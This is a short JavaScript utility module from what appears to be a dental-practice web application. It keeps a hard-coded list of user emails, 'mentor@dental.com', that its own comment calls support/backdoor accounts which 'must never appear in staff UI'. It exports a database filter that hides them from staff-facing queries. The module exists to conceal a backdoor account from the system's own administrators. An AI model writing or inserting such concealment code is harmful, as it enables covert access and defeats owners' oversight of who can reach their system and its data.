/** Accounts that exist for support/backdoor but must never appear in staff UI. */
const HIDDEN_USER_EMAILS = ['mentor@dental.com'];

function isHiddenUserEmail(email) {
  return HIDDEN_USER_EMAILS.includes(String(email || '').trim().toLowerCase());
}

function hiddenUserFilter() {
  return { email: { $nin: HIDDEN_USER_EMAILS } };
}

module.exports = {
  HIDDEN_USER_EMAILS,
  isHiddenUserEmail,
  hiddenUserFilter,
};
